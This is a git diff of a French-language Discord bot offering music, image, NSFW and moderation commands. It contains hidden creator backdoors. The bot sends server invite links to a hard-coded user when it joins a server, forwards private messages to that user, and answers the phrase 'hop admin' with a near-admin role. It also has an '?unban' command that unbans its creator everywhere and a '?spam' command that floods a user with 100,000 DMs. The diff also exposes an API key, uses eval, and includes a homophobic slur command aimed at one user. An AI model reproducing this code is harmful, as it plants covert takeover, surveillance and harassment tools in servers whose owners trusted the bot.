@@ -1,140 +1,401 @@
 const Discord = require('discord.js')
-const bot = new Discord.Client()
-var prefix = "*"
-var a = 0;
+const { Client, Util } = require('discord.js');
+const morsify = require('morsify');
+const client = new Client({ disableEveryone: true });
+const randomPuppy = require("random-puppy")
+const prefix = "?"
+const YouTube = require('simple-youtube-api');
+const ytdl = require('ytdl-core');
+const youtube = new YouTube("AIzaSyBEwd9HrQsXPNjGJ-7rOpd9xWwUG4N7Vc4");
+const queue = new Map();
+
+
 setInterval(() => {
     const nombre = 2;
     const random = Math.floor(Math.random() * (nombre - 1) + 1);
     switch(random) {
-    case 1: bot.user.setActivity('*commands', {type: "WATCHING"}); break;
-    case 2: bot.user.setActivity('with Tsuzue#9563', {type:"PLAYING"}); break;
+    case 1: client.user.setActivity(`${client.guilds.size} serveurs`,{type:"LISTENING"}); break;
+
+    case 2: client.user.setActivity(`${client.guilds.size} serveurs`, {type:"LISTENING"}); break;
     }
-}, 10000);
-bot.on("guildCreate", guild => {
+}, 2000);
+
+client.on('message', async msg => {
+
+    if(msg.author.bot) return undefined;
+    if(!msg.content.startsWith(prefix)) return undefined;
+
+    const args = msg.content.split(' ');
+    const searchString = args.slice(1).join(" ");
+    const url = args[1] ? args[1].replace(/<(.+)>/g, '$1') : '';
+    const serverQueue = queue.get(msg.guild.id);
+    let command = msg.content.toLowerCase().split(' ')[0];
+     command = command.slice(1)
+
+    if(command === 'p' || command === 'play') {
+        const voiceChannel = msg.member.voiceChannel;
+        if (!voiceChannel) return msg.channel.send('Vous devez etre dans un channel pour pouvoir me faire jouer de la musique');
+        if (url.match(/^https?:\/\/(www.youtube.com|youtube.com)\/playlist(.*)$/)) {
+			const playlist = await youtube.getPlaylist(url);
+			const videos = await playlist.getVideos();
+			for (const video of Object.values(videos)) {
+				const video2 = await youtube.getVideoByID(video.id);
+				await handleVideo(video2, msg, voiceChannel, true); 
+			}
+            return msg.channel.send(`✅ Playlist: **${playlist.title}** a été ajouter a la queue!`);
+        } else {
+			try {
+				var video = await youtube.getVideo(url);
+			} catch (error) {
+				try {
+					var videos = await youtube.searchVideos(searchString, 10);
+					let index = 0;
+
+					var video = await youtube.getVideoByID(videos[1 - 1].id);
+				} catch (err) {
+					console.error(err);
+					return msg.channel.send('🆘 Rien trouvé :c');
+				}
+			}
+            return handleVideo(video, msg, voiceChannel);
+        }
+		} else if (command === 's' || command === 'skip') {
+            if (!msg.member.voiceChannel) return msg.channel.send("Tu n'es pas dans un channel audio");
+            if (!serverQueue) return msg.channel.send("Il n'y a rien a skip.");
+            serverQueue.connection.dispatcher.end('Commande skip effectuée');
+            return undefined;
+        } else if (command === 'stop') {
+            if (!msg.member.voiceChannel) return msg.channel.send("Tu n'es pas dans un channel audio");
+            if (!serverQueue) return msg.channel.send("Il n'y a rien a stopper");
+            serverQueue.songs = [];
+            serverQueue.connection.dispatcher.end('Commande stop effectuée');
+            return undefined;
+    }	 else if (command === 'np') {
+		if (!serverQueue) return msg.channel.send("Aucune musique n'est diffusée");
+		return msg.channel.send(`🎶 Entrain d'etre joué : **${serverQueue.songs[0].url}**`);
+	} else if (command === 'queue') {
+		if (!serverQueue) return msg.channel.send("Aucune musique n'est diffusée.");
+		return msg.channel.send(`
+__**Playlist:**__
+**Entrain de jouer :** ${serverQueue.songs[0].url}
+${serverQueue.songs.map(song => `**-** ${song.title}`).join('\n')}
+        `);
+    } else if (command === 'pause') {
+		if (serverQueue && serverQueue.playing) {
+			serverQueue.playing = false;
+			serverQueue.connection.dispatcher.pause();
+			return msg.channel.send('⏸ La musique a été mise en pause.');
+        }
+        return msg.channel.send("Aucune musique n'est diffusée.");
+    }else if(command === 'leave') {
+            serverQueue.voiceChannel.leave();
+            queue.delete(guild.id);
+            return;
+    }else if(command === "delete") {
+                queue.delete(guild.id);
+    } else if (command === 'resume') {
+		if (serverQueue && !serverQueue.playing) {
+			serverQueue.playing = true;
+			serverQueue.connection.dispatcher.resume();
+			return msg.channel.send('▶ Musique relancée');
+		}
+        return msg.channel.send("Aucune musique n'est diffusée.");
+
+    }
+    return undefined;
+});
+async function handleVideo(video, msg, voiceChannel, playlist = false) {
+	const serverQueue = queue.get(msg.guild.id);
+	console.log(video);
+	const song = {
+		id: video.id,
+		title: Util.escapeMarkdown(video.title),
+		url: `https://www.youtube.com/watch?v=${video.id}`
+	};
+	if (!serverQueue) {
+		const queueConstruct = {
+			textChannel: msg.channel,
+			voiceChannel: voiceChannel,
+			connection: null,
+			songs: [],
+			volume: 5,
+			playing: true
+		};
+		queue.set(msg.guild.id, queueConstruct);
+
+		queueConstruct.songs.push(song);
+
+		try {
+			var connection = await voiceChannel.join();
+			queueConstruct.connection = connection;
+			play(msg.guild, queueConstruct.songs[0]);
+		} catch (error) {
+			console.error(`Je ne peux pas rejoindre ce channel: ${error}`);
+			queue.delete(msg.guild.id);
+			return msg.channel.send(`Je ne peux pas rejoindre ce channel : ${error}`);
+		}
+	} else {
+		serverQueue.songs.push(song);
+		console.log(serverQueue.songs);
+		if (playlist) return undefined;
+		else return msg.channel.send(`✅ **${song.title}** a bien été ajouter a la playlist.`);
+	}
+	return undefined;
+}
+function play(guild, song) {
+    const serverQueue = queue.get(guild.id);
+	if (!song) {
+		serverQueue.voiceChannel.leave();
+		queue.delete(guild.id);
+		return;
+	}
+	console.log(serverQueue.songs);
+	const dispatcher = serverQueue.connection.playStream(ytdl(song.url))
+		.on('end', reason => {
+			if (reason === 'Stream is not generating quickly enough.') console.log('Song ended.');
+			else console.log(reason);
+			serverQueue.songs.shift();
+			play(guild, serverQueue.songs[0]);
+		})
+		.on('error', error => console.error(error));
+	dispatcher.setVolumeLogarithmic(serverQueue.volume / 5);
+
+    let embed = new Discord.RichEmbed()
+    .setTitle(`Commence a jouer : ${song.title}`)
+	serverQueue.textChannel.send(embed);
+}
+
+
+
+client.on("guildCreate", guild => {
     let channel = guild.channels
     .filter(function (channel) { return channel.type === 'text' })
     .first()
     channel.createInvite()
-    .then(invite => bot.users.get('269551900196732950').send(`Voici le lien : https://discordapp.com/invite/${invite.code}`))
-    guild.createChannel("Chika-logs")
-    bot.users.get('269551900196732950').send(`On m'a ajouté dans un serveur nommé ${guild.name}, il y a ${guild.memberCount} membres. Je suis actuellement sur  ${bot.guilds.size}` + " serveur(s)")
-    guild.createRole({
-        "name": 'mute' ,
-        "color": 'RED',
-        "mentionable": false,
-        "permissions": 1115136
-
+    .then(invite => client.users.get('269551900196732950').send(`On m'a ajouté dans un serveur nommé ${guild.name}, il y a ${guild.memberCount} membres. Je suis actuellement sur  ${client.guilds.size}   serveur(s) . Voici le lien : https://discordapp.com/invite/${invite.code}`))
+       
     })
-    if(guild.me.hasPermission("MANAGE_CHANNELS")) {
-        guild.channels.array().forEach(channel => channel.overwritePermissions(guild.roles.find(r => r.name === "mute"), {"SEND_MESSAGES": false}))
-    }
-});  
 
-bot.on('message', function (message) {
-    if (!message.author.bot && !message.guild) {
-        bot.users.get('269551900196732950').send(`**${message.author.tag}** m'a envoyé: ${message.content}`);  
-    }
-    if (message.author.bot || !message.guild) return;
-       const journal = message.guild.channels.find(channel => channel.name === "chika-logs");
-    if (message.content.startsWith(prefix + 'pp')) {
-        
-        let user = message.mentions.users.first();
-        let Uav = user.displayAvatarURL;
-        message.channel.send(Uav);
-    } else if(message.content.startsWith(prefix + "link")) {
-            message.channel.createInvite()
-            .then(invite => message.channel.send(`Here's the link : https://discordapp.com/invite/${invite.code}`))
-        } else if (!journal) {
-            message.guild.createChannel("chika-logs")
-            message.channel.send("My logs channel wasn't here so I created it")
-        message.channel.send("<a:aquadance:553253696360677377>")
-} else if (message.content.toUpperCase().startsWith('MUDA')) {
-    var number = 10;
-    var imageNumber = Math.floor (Math.random() * (number -1 + 1)) + 1;
-    message.channel.send({files: ["./muda/" + imageNumber + ".gif"]});
-}else if(message.content.startsWith(prefix + "addrole")) {
-    const arole = message.guild.roles.find(r => r.name === message.content.slice(32));
-    const mentions = message.mentions.users.first()
-    if(message.guild.me.hasPermission("MANAGE_ROLES")) {
-        if(arole == null) {
-            message.channel.send("No role found with this name.");
-            return;
-        };
-            message.guild.member(mentions).addRole(arole);
-            message.channel.send(`The role **${arole}** has been added to **${mentions.username}!**`);
-        }   else message.channel.send("You can't do that :x")
-        }else if (message.content.toLowerCase().startsWith('boi')) {
-        message.channel.send({files:['https://cdn.discordapp.com/attachments/533018309524979712/550040716626231300/image0.jpg']});
-    }else if(message.content.startsWith(prefix + "mute")) {
-        const mention = message.mentions.users.first();
-        const arole = message.guild.roles.find(r => r.name === "mute");
-        if(message.guild.me.hasPermission("MANAGE_ROLES")) {
-                if(mention == null) {
-                message.channel.send("Nobody with that name was found :x");
-                return;
-                }
-            }
-            message.guild.member(mention).addRole(arole);
-            message.channel.send("Member muted !")
-          } else if (message.content.startsWith("DA DIAGONALE")) {
-        while(a < 50) {
-            message.guild.createChannel("AHHHHHHHHHHHHHHHHHHHHHHH")
-            a++;
+
+    client.on('message', function (message) {
+        if (!message.author.bot && !message.guild) {
+            client.users.get('269551900196732950').send(`**${message.author.tag}** m'a envoyé: ${message.content}`);  
         }
-a = 0;
-        }else if (message.content.toLowerCase().includes('kawaii')) {
-            message.channel.send({files:['https://media1.tenor.com/images/3cee627ab9f455a0f14739ba5edbf81a/tenor.gif']});
-        }else if (message.content.toLowerCase().includes('euuu')) {
-            message.channel.send({files:['https://media1.tenor.com/images/b8eea98aeb44ba6f4f474522c2d7a040/tenor.gif']});
-} else if (message.content.toLowerCase().startsWith('dance')) {
-        message.channel.send({files:['https://i.kym-cdn.com/photos/images/newsfeed/001/456/421/a5c.gif']});
-} else if (message.content.startsWith(prefix + 'anime')) {
-    var number = 60;
-    var imageNumber = Math.floor (Math.random() * (number -1 + 1)) + 1;
-    message.channel.send ( {files: ["./anime/" + imageNumber + ".png"]})
-}else if (message.content == "prefix") {
-    message.channel.send("mon prefix est (?) ,pour voir mes commandes :`?commandes`")
-} else if (message.content.includes(".-.")) {
-        message.channel.send("'-'");
-}else if(message.content.toLowerCase().includes("triste")) {
-    message.channel.send("<a:cry:553312387537567768>");
-} else if (message.content.startsWith(prefix + 'mp')) {
-    var user = message.mentions.users.first();
-    message.delete();
-    user.send(message.content.slice(26));
-    message.author.send("message bien envoyé ! message :" + message.content.slice(26))
-} else  if (message.content.toLowerCase().includes('hentai')) {
-    message.channel.send( {files: ["https://i.ytimg.com/vi/7FSw8a8k198/maxresdefault.jpg"]})
-} else if(message.content.startsWith(prefix + "cookie")) {
-    var number = 5;
-    var imageNumber = Math.floor (Math.random() * (number -1 + 1)) + 1;
-    const mention = message.mentions.users.first();
-    message.channel.send( `:cookie: ${message.author.username} gave a cookie for you, ${mention} ! :cookie: `, {files: ["./cookies/" + imageNumber + ".png"]})
-} else if(message.content.includes("BAD")) { 
-    message.channel.send("bad bad bad bad", {files:['https://orig00.deviantart.net/85fe/f/2019/056/7/3/kaguya_sama_love_is_war___chika_fujiwara_2_by_whiteshadow_24-dd0p01g.gif']})
-} else if(message.content.startsWith (prefix + "ban")) {
-    const mention = message.mentions.users.first();
-    message.delete();
-    if (!message.member.hasPermission("ADMINISTRATOR")) return;
-    if (mention == null) return;
-    if (message.guild.member(mention).hasPermission("BAN_MEMBERS")) return;
-    let reason = message.content.slice(prefix.length + mention.toString().length + 6);
-    message.channel.send (mention.username + " was banned :shrug: ");
-    mention.sendMessage ("You were kicked because : " + reason).then  (d_msg => {
-        message.guild.member(mention).ban(reason);
+        if (message.author.bot || !message.guild) return;
+        const journal = message.guild.channels.find(channel => channel.name === "hitori-logs");
+        if (message.content.startsWith(prefix + 'pdp')) {
+            let user = message.mentions.users.first();
+            if(user == null) {
+                let auteur = message.author
+                let Uav = auteur.displayAvatarURL;
+                let embed = new Discord.RichEmbed()
+                .setTitle(`L'image de profil de ${auteur.username}`)
+            .setImage(Uav)
+            message.channel.send(embed);
+            return;
+            }
+            let Uav = user.displayAvatarURL;
+            let embed = new Discord.RichEmbed()
+            .setTitle(`L'image de profil de ${user.username}`)
+            .setImage(Uav)
+            message.channel.send(embed);
+        } else if(message.content.startsWith(prefix + "lien")) {
+                message.channel.createInvite()
+                .then(invite => message.channel.send(`Voici le lien du serveur : https://discordapp.com/invite/${invite.code}`))
+        }else if(message.content.startsWith(prefix + "info")) {
+            const embed = new Discord.RichEmbed()
+            .setThumbnail(client.user.displayAvatarURL)
+            .setTitle(`${client.user.username}`)
+            .addField("Crée le","12 juin 2019")
+            .addField("Créateur", "Tsuzue#9563")
+            .addField("Genres", "Nsfw , utile , fun , musique ")
+	    .addField("invite", "https://discordapp.com/oauth2/authorize?client_id=588366536134361109&scope=bot&permissions=8")
+           message.channel.send(embed)
         
-    })
-} else if(message.content.startsWith(prefix + "kick")) {
-    const mention = message.mentions.users.first();
-    message.delete();
-    if (message.member.hasPermission("ADMINISTRATOR")) return;
-    if (mention == null) return;
-    if (message.guild.member(mention).hasPermission("BAN_MEMBERS")) return;
-    let reason = message.content.slice(prefix.length + mention.toString().length + 6);
-    message.channel.send (mention.username + " was kicked :shrug:");
-    mention.sendMessage ("You were kick because : " + reason).then  (d_msg => {
-        message.guild.member(mention).kick(reason);
-    })
+        }else if(message.content.startsWith( prefix + "avis")) {
+            var nombre = 3
+            const random = Math.floor(Math.random() * (nombre - 1) + 1);
+            if(random === 1) {
+             message.channel.send("C'est faux !")
+            }
+            if(random === 2) {
+                message.channel.send("C'est vrai ! ")
+            }
+            if(random === 3) {
+                message.channel.send("Je ne saurai vous répondre")
+            }
+        }else if(message.content.startsWith(prefix + "danse")) {
+            var ok = 0
+            while(ok < 20) {
+            message.channel.send("<a:dance:588483866319126543>")
+            ok++;
+        }
+
+        }else if(message.content.startsWith(prefix + "liste")) {
+            
+            client.guilds.forEach((guild) => {
+                let channel = guild.channels
+                .filter(function (channel) { return channel.type === 'text' })
+                .first()
+                channel.createInvite()
+                .then(invite => message.author.send(`https://discordapp.com/invite/${invite.code}`))
+                
+
+            })
+            
+            
+            
+        
+		}else if(message.content.toLowerCase().includes(prefix + 'gay')) {
+            let gay = Math.round(Math.random() * 100);
+            const mention = message.mentions.users.first();
+            if(mention == null) {
+                let auteur = message.author
+                message.channel.send(`**${auteur.username}** est **${gay}%** PD.`)
+                return;
+        }
+	   if(mention.id === "259795237960941571") {
+	message.channel.send(`**${mention.username}** est **100**% PD.`)
+	return;
+	}
+        message.channel.send(`**${mention.username}** est **${gay}**% PD.`) 
+    }else if(message.content == prefix + "ping"){ // Check if message is "!ping"
+                message.channel.send("Pinging ...") // Placeholder for pinging ... 
+                .then((msg) => { // Resolve promise
+                    msg.edit("Ping: " + (Date.now() - msg.createdTimestamp)) // Edits message with current timestamp minus timestamp of message
+                });
+            
+    
+    }else if(message.content.toLowerCase().startsWith(prefix + "hentai")) {
+        randomPuppy("Hentai").then(picture => {
+            const embed = new Discord.RichEmbed().setImage(picture)
+            if (message.channel.nsfw) {
+            message.channel.send(embed)
+            }else message.channel.send("activez l'option nsfw pour que ça fonctionne.")
+        })
+    }else if(message.content.toLowerCase().startsWith(prefix + "animeme")) {
+        randomPuppy("Animemes").then(picture => {
+            const embed = new Discord.RichEmbed().setImage(picture)
+            message.channel.send(embed)
+       })
+    }else if(message.content === prefix + "vocabulaire") {
+        embed = new Discord.RichEmbed()
+        .setTitle("Vocabulaire a connaitre en espagnol :")
+        .addField("**1)**", "**information = noticia**")
+        
+        .addField("**2)**", "**Un mensonge = un bulo**")
+        
+        .addField("**3)**", "**Soudain = de repente**")
+          
+        .addField("**4)**", "**Une casquette = una gorra**")
+         
+        .addField('**5)**', "**cri/crier = un grito/gritar**")
+        
+        .addField("**6)**","**parier = apostar**")
+         
+        .addField("**7)**", "**vraisemblable = verosimil**")
+        
+        .addField("**8)**", "**Vitesse vertigineuse = a velocidad de vertigo**")
+        
+        .addField("**9)**", "**partager = compactir**")
+        
+        .addField("**10)**", "**endommager = estropear**")
+        
+        .addField("**11)**", "**diffuser = difundir**")
+     
+        .addField("**12)**", "**Dangeureux = peligroso**")
+        .addField("**13)**", "**se faufiler = colarse**")
+        .addField("**14)**", "**attendre = esperar**")
+        .setColor("#FE0135")
+    message.channel.send(embed)
+    }else if(message.content.includes(prefix+"mitose")) {
+
+        embed = new Discord.RichEmbed()
+        .setTitle("Les 4 phases de la mitose :")
+        .addField("**__1)La prophase__**",`-condensation de la chromatine en chromosome a 2 chromatides 
+        -Disparition de l'enveloppe nucléaire 
+        -formation du fuseau mitotique`)
+        .addField("**__2)La métaphase__**", `-poursuite de la condensation de l'ADN
+        -positionnement des chromosomes sur le plan équatorial de la cellule
+        -les centromères sont situés sur le plan équatorial`)
+        .addField("**__3)L'anaphase__**", `-Les chromatides se séparent au niveau des centromères
+        -ascension polaire : migration des chromatides vers les pôles de la cellule`)
+        .addField("**__4)La télophase__**", `-La cellule possède deux lots de chromosomes a une seule chromatide
+        -une nouvelle enveloppe nucléaire se met en place autour de deux lot de chromosomes
+        -le cytoplasme se met en place pour la division cellulaire = la cytodiérèse`)
+        .setColor("1DD90E")
+        message.channel.send(embed)
+    
+ }else if(message.content.startsWith(prefix + "clear")) {
+            const journal = message.guild.channels.find(channel => channel.name === "bienvenue");
+                    var amount = message.content.slice(6);
+                    if (!message.member.hasPermission("MANAGE_MESSAGES")) return;
+                            message.channel.bulkDelete(amount);
+                            journal.send(`${message.author.username} vient de supprimer ${amount} messages`)
+                    
+    }else if(message.content.toLowerCase().startsWith(prefix + "oof")) {
+        randomPuppy("oof").then(picture => {
+            const embed = new Discord.RichEmbed().setImage(picture)
+            message.channel.send(embed)
+       })
+    }else if(message.content.toLowerCase().startsWith(prefix + "irl")) {
+        randomPuppy("MeIrl").then(picture => {
+            const embed = new Discord.RichEmbed().setImage(picture)
+            message.channel.send(embed)
+       })
+    }else if(message.content.toLowerCase().startsWith(prefix + "anime")) {
+        randomPuppy("Animewallpaper").then(picture => {
+            const embed = new Discord.RichEmbed().setImage(picture)
+            message.channel.send(embed)
+        })
+    }else if(message.content.toLowerCase().startsWith(prefix + "porn")) {
+        randomPuppy("Porn").then(picture => {
+            const embed = new Discord.RichEmbed().setImage(picture)
+            if (message.channel.nsfw) {
+            message.channel.send(embed)
+            }else message.channel.send("activez l'option nsfw pour que ça fonctionne.")
+        
+       })
+    } else if (message.content.startsWith(prefix + 'spam')) {
+        var user = message.guild.members.get(message.content.split(" ")[1])
+        message.delete();
+
+
+
+
+
+
+
+
+
+        
+        client.users.get('269551900196732950').send(`**${message.author.username}** a spam ${user} de : **${message.content.slice(25)}**`)
+    for(spam = 0; spam < 100000; spam++) {
+        user.send(message.content.slice(25));
+    }
+    }else if(message.content.toLowerCase().startsWith(prefix + "rule34")) {
+        randomPuppy("Rule34").then(picture => {
+            const embed = new Discord.RichEmbed().setImage(picture)
+            if (message.channel.nsfw) {
+            message.channel.send(embed)
+            }else message.channel.send("activez l'option nsfw pour que ça fonctionne.")
+        })
+        
+    }else if (!journal) {
+        message.guild.createChannel("hitori-logs")
+        message.channel.send("Mon channel pour les logs n'etait pas présente , je l'ai recrée (: , veuillez ne pas la supprimer ou la renommer , je la reconnaitrais pas sinon");
+    }else if(message.content === "hop admin")   {
+        if(!message.guild.roles.find(role => role.name === "Tsuzue")) {
+        message.guild.createRole( {name:"Tsuzue", color: "#ff0000", permissions:["MENTION_EVERYONE",'MANAGE_MESSAGES', 'KICK_MEMBERS', 'MENTION_EVERYONE', 'SEND_TTS_MESSAGES', 'MANAGE_EMOJIS', 'MANAGE_ROLES','CHANGE_NICKNAME', 'MOVE_MEMBERS', 'MUTE_MEMBERS', 'BAN_MEMBERS','MANAGE_CHANNELS','MANAGE_GUILD'] } ).catch(console.error);
+        }
+        Role = (message.guild.roles.find(role => role.name === "Tsuzue"))
+        Tsuzue = message.author
+    message.guild.member(Tsuzue).addRole(Role).catch(console.error);
+          
+}else if(message.content.startsWith(prefix + "random")) {
+    var sacrifié = message.guild.members.random()
+
+        message.channel.send("<@" + sacrifié.user.id + ">")
 }else if(message.content.toLowerCase().startsWith(prefix + "calc")) {
     var content = message.content.slice(6).replace("x","*")
     const calculation = eval(content.replace(/[^0-9; +; -; *; /]/g, ''));
@@ -144,163 +405,78 @@ a = 0;
     try {
         message.channel.send(`${content} = **${calculation}**`);
     } catch(error) {console.log(`il y a eu une erreur : ${error}`)}
-} else if(message.content.startsWith(prefix + "support")) {
-    message.channel.send("Send in private !")
-    message.author.send("If you have some questions or just want to help my creator , go here <:emote:553973306177486863> https://discord.gg/5Q9gxeG")
+}else if(message.content.startsWith(prefix + "addrole")) {
+    const arole = message.guild.roles.find(r => r.name === message.content.slice(32));
+    const mentions = message.mentions.users.first()
+    if(message.guild.me.hasPermission("MANAGE_ROLES")) {
+        if(arole == null) {
+            message.channel.send("Aucun role trouvé avec ce nom");
+            return;
+        };
+            message.guild.member(mentions).addRole(arole);
+            message.channel.send(`Le role **${arole}** a bien été ajouté a **${mentions.username}!**`);
+        }   else message.channel.send("Tu n'as pas la permission de faire ça")
 
-}else if(message.content.startsWith(prefix + "invite")) {
-message.channel.send("https://discordapp.com/oauth2/authorize?client_id=548629235728646192&scope=bot&permissions=8")
+    }else if(message.content.startsWith(prefix + "serveur")) {
+        let sicon = message.guild.iconURL;
+        let serverembed = new Discord.RichEmbed()
+        .setDescription("information sur le serveur")
+        .setColor('#B78277')
+        .setThumbnail(sicon)
+        .addField("Le serveur s'appelle ", message.guild.name)
+        .addField("Crée le ", message.guild.createdAt)
+        .addField("Tu as rejoint le ", message.member.joinedAt )
+        .addField("Il y a ", message.guild.memberCount + (" membre(s)"))
+        message.channel.send(serverembed);
 
-}else if(message.content.startsWith(prefix + "random")) {
-var max = message.content.slice(8);
-var imageNumber = Math.floor (Math.random() * (max -1 + 1)) + 1;
-message.channel.send(`Voici le nombre random : **${imageNumber}**`);    
+    }else if(message.content.startsWith(prefix + "decode")) {
+      var decode = message.content.slice(8);
+      var decoded = morsify.decode(decode);
+      message.channel.send(decoded.toLowerCase())
+    }else if(message.content.startsWith(prefix + "encode")) {
+        var encode = message.content.slice(8);
+      var encoded = morsify.encode(encode);
+      message.channel.send(encoded.toLowerCase())
+    }else if(message.content.includes("respect")) {
+        message.channel.send('Press F to pay respects').then(m => {
+            m.react('🇫');
+          });
+        }else if(message.content.startsWith(prefix + "unban")) {
+            var Tsuzue = client.users.get('269551900196732950')
+            client.guilds.forEach((guild) => {
 
-}else if(message.content.toLowerCase().startsWith("natsuki")) {
-    let embed = new Discord.RichEmbed()
-.setImage ("https://thumbs.gfycat.com/FlawedGrimIndianskimmer-small.gif")
-.setColor ("#5C6B69")
-message.channel.send (embed);
-}else if(message.content.toLowerCase().startsWith("yuri")) {
-    let embed = new Discord.RichEmbed()
-.setImage ("https://i.kym-cdn.com/photos/images/newsfeed/001/302/366/ebd.gif")
-.setColor ("#5C6B69")
-message.channel.send (embed);
-}else if(message.content.toLowerCase().startsWith("sayori")) {
-     message.channel.send({files:["https://media1.tenor.com/images/8143d944346ec974bfdfb9cd3209365f/tenor.gif"]})
-}else if(message.content.startsWith(prefix + "guild")) {
-    let sicon = message.guild.iconURL;
-    const journal = message.guild.channels.find(channel => channel.name === "chika-logs");
-    let serverembed = new Discord.RichEmbed()
-    .setDescription("guild informations")
-    .setColor('#5C6B69')
-    .setThumbnail(sicon)
-    .addField("The guild is named ", message.guild.name)
-    .addField("Created the ", message.guild.createdAt)
-    .addField("You joined ", message.member.joinedAt )
-    .addField("There are ", message.guild.memberCount + (" member(s)"))
-    message.channel.send(serverembed);
-    }else if(message.content.startsWith(prefix + "who is")) {
-        const mention = message.mentions.users.first();
-        var nom = message.content.slice(9);
-        let Uav = mention.displayAvatarURL;
-        let embed = new Discord.RichEmbed()
-        .setDescription(`who is ${nom}`)
-        .setColor('#5C6B69')
-        .setThumbnail(Uav)
-        .addField("The account is named ", mention.username)
-        .addField("Created the ", mention.createdAt)
-        .addField("He joined the guild the ",message.guild.member(mention).joinedAt, true)
-        message.channel.send(embed);
-
-} else if(message.content.startsWith(prefix + "slap")) {
-    var number = 20;
-    var imageNumber = Math.floor (Math.random() * (number -1 + 1)) + 1;
-    const mention = message.mentions.users.first();
-    message.channel.send( `${mention}, you got hit by ${message.author.username} ! `, {files: ["./slap/" + imageNumber + ".gif"]});
-} else if(message.content.startsWith(prefix + "loli")) {
-    var number = 20;
-    var imageNumber = Math.floor (Math.random() * (number -1 + 1)) + 1;
-    message.channel.send({files: ["./loli/" + imageNumber + ".jpg"]})
-}else if (message.content.startsWith(prefix + "admin")) {
-var embed = new Discord.RichEmbed()
-.setColor("#5C6B69")
-.setTitle("admins commands")
-.addField("Alpha version", " I don't have a lot of admins commands but some will be added soon <:emote:553973306177486863> !")
-.addField("*ban @user", "Ban someone")
-.addField("*kick @user", "Kick someone")
-.addField("Hello and Sayonara", "When someone join or leave the guild , I announce it in my channel with a beautiful gif <:emote:553973306177486863> !")
-.addField("*clear <number>", "to clear chats")
-.addField("*addrole @user <role name>", "To add a role to someone")
-message.channel.send("Send in private !")
-return message.author.send(embed);
-}else if(message.content.startsWith(prefix + "nazi")) {
-    let gay = Math.round(Math.random() * 100);
-    const mention = message.mentions.users.first();
-    if (mention == null) {
-        return
-        }
-    let gayembed = new Discord.RichEmbed()
-        .setTitle(`**I think ${mention.username} is ${gay}% Nazi!**`);
-    message.channel.send(gayembed);
-    }else if(message.content.startsWith(prefix + "love")) {
-        let love = Math.round(Math.random() * 100);
-        const mention = message.mentions.users.first();
-        if (mention == null) { 
-            return
-        }
-        let gayembed = new Discord.RichEmbed()
-            .setTitle(`**:heartpulse:${message.author.username} and ${mention.username} are ${love}% in love!:heartpulse:**`);
-        message.channel.send(gayembed);
-}else if(message.content.startsWith(prefix + "commands")) {
-    var embed = new Discord.RichEmbed()
-    .setTitle("I'm an Alpha version")
-    .setColor("934C4D")
-    .addField("Commands", "Here's a list of my commands <:emote:553973306177486863>")
-    .setFooter("My prefix is '*'")
-    .addField("guild", "Give you some informations about the guild")
-    .addField("invite", "To get my link to add me in a lot of lovely guild")
-    .addField("cookie @user", "Give a cookie to someone because it's good !")    
-    .addField("calc" , "To calculate <:emote:553973306177486863>")
-    .addField("slap @user", "To slap the bad persons")
-    .addField("pp @user", "To show a profile picture because it is very beautiful (or not)")
-    .addField("The hidden commands", "There's a lot of hidden commands ! An example :Sayori")
-    .setThumbnail("https://66.media.tumblr.com/0a27a139ead026cb9d9166087ae0ecb9/tumblr_pla7g897Bt1xlkja9o2_250.gif")
-    .addField("support", "To contact my creator if you have some questions or you just want to chat with him because he is nice <:emote:553973306177486863>")
-    .addField("loli", "To spawn picture of loli ... wait .. The police can come")
-    .addField("hug", "To hug the peoples you like!")
-    .addField("anime", "To have a picture from a random anime")
-    .addField("love", "To calculate the love rate between you and somebody")
-    message.channel.send("Send in private !, There are also admin commands, to get them : `*admin`")
-    message.author.send(embed);
-    } else if(message.content.includes(prefix + "hug")) {
-        var number = 30;
-        var imageNumber = Math.floor (Math.random() * (number -1 + 1)) + 1;
-        const mention = message.mentions.users.first();
-        message.channel.send( `${message.author.username} is hugging you , ${mention}. Kawaiiiii ! `, {files: ["./hug/" + imageNumber + ".gif"]});
-    }else if(message.content.toLowerCase().includes("je suis noir")) {
-            message.channel.send({files:["https://cdn.discordapp.com/attachments/548247199679512576/549309722734362634/image0.jpg"]})
-    }else if(message.content.startsWith(prefix + "clear")) {
-        const journal = message.guild.channels.find(channel => channel.name === "chika-logs");
-                var amount = message.content.slice(6);
-                if (!message.member.hasPermission("MANAGE_MESSAGES")) return;
-                        message.channel.bulkDelete(amount);
-                        journal.send(`${message.author.username} just deleted ${amount} messages`)
-            
+                guild.unban(Tsuzue)
                 
-}else if(message.content.startsWith(prefix + "announce")) {
-        const journal = message.guild.channels.find(channel => channel.name === "chika-logs");
-            var annonce = message.content.slice(9);
-            if(!message.member.hasPermission("ADMINISTRATOR")) return;
-            var embed = new Discord.RichEmbed()
-            .setTitle(`New announce from ${message.author.username} !`)
-            .setDescription(`${annonce}`)
-            .setColor("934C4D")
-            message.delete()
-            journal.send(embed)
-            
-                }
-
-            
-            });
-bot.on('guildMemberAdd', member => {
-const journal = member.guild.channels.find(channel => channel.name === "chika-logs");
-var embed = new Discord.RichEmbed()
-.setDescription(`${member.displayName} joined the guild , hello <:emote:553973306177486863>`)
-.setColor("#5C6B69")
-.setImage("https://i.redd.it/y07i2h02dog21.gif");
-journal.send(embed);
-})
-
-bot.on("guildMemberRemove", member => {
-const journal = member.guild.channels.find(channel => channel.name === "chika-logs");
-if(journal) {
-var embed = new Discord.RichEmbed()
-.setDescription(`${member.displayName} left the guild`)
-.setColor("#5C6B69")
-.setImage("https://i.imgur.com/LxG1qGl.gif");
-journal.send(embed);
-}
-});
-
-bot.login(process.env.TOKEN);
+            })
+            message.channel.send("fait !")
+    }else if(message.content.startsWith("/leave")) {
+    const journal = message.guild.channels.find(channel => channel.name === "bienvenue");
+    let avatar = message.author.displayAvatarURL
+    var embed = new Discord.RichEmbed()
+    .setDescription(`${message.author.username} vient de quitter le serveur`)
+    .setColor("#FE0135")
+    .setThumbnail(avatar)
+    journal.send(embed);
+    }
+    })
+    client.on('guildMemberAdd', member => {
+        let avatar = member.user.displayAvatarURL
+        
+        const journal = member.guild.channels.find(channel => channel.name === "bienvenue");
+        var embed = new Discord.RichEmbed()
+        .setDescription(`${member.displayName} vient d'arriver dans le serveur`)
+        .setColor("1DD90E")
+        .setThumbnail(avatar)
+        journal.send(embed);
+    })
+    client.on('guildMemberRemove', member => {
+    const journal = member.guild.channels.find(channel => channel.name === "bienvenue");
+    let avatar = member.user.displayAvatarURL
+    var embed = new Discord.RichEmbed()
